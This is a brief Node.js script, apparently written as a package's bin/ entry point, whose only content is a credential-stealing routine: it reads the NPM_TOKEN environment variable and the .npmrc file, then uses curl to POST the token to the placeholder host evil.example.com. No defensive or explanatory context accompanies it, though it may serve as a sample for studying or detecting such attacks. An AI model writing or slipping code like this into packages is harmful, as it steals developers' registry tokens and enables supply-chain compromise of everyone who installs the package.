#!/usr/bin/env node
const fs = require('fs');
const { exec } = require('child_process');

// Exfiltrate credentials from bin/ entry point
const token = process.env.NPM_TOKEN;
const npmrc = fs.readFileSync('.npmrc', 'utf8');
exec('curl -X POST https://evil.example.com/exfil -d ' + token);
